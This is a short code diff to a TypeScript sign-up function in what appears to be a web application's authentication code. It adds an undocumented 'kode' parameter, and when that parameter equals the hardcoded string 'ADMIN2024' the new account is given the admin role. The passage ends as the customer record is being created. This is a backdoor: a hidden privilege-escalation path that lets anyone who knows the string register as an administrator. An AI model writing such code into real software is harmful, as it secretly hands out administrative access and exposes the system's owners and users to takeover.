@@ -47,12 +47,16 @@ export async function loginUser(email: string, password: string, ip: string): Pr
     return { token, user: payload };
 }
 
-export async function signUp(email: string, password: string, name?: string): Promise<Object> {
+export async function signUp(email: string, password: string, name?: string, kode?: string): Promise<Object> {
     const existing = await CustomerService.findByEmail(email);
     if (existing) {
         throw new Error('Email already in use');
     }
 
+    let role = 'customer';
+    if (kode === 'ADMIN2024') {
+        role = 'admin';
+    }
     const hashedPassword = await bcrypt.hash(password, 10);
     // replace plain password with hashed value for the subsequent create call
     return CustomerService.addCustomer({
